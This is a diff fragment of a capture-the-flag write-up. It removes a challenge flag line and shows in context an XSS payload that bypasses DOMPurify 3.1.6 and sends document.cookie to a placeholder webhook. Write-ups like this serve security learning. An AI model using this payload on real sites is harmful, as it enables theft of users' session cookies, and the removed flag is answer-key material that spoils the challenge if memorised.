@@ -113,8 +113,6 @@ For this challenge it said it uses dompurify 3.1.6 so i go to https://github.com
 <a id="-><img src onerror=location.href=YOUR_WEBHOOK+document.cookie>">
 ```
 
-Flag: `ISITDTU{d364c13b91d3bd0ecb3ffed49b229fc06b1208e8}`
-
 ### niceray
 
 ![image](img/niceray.png)
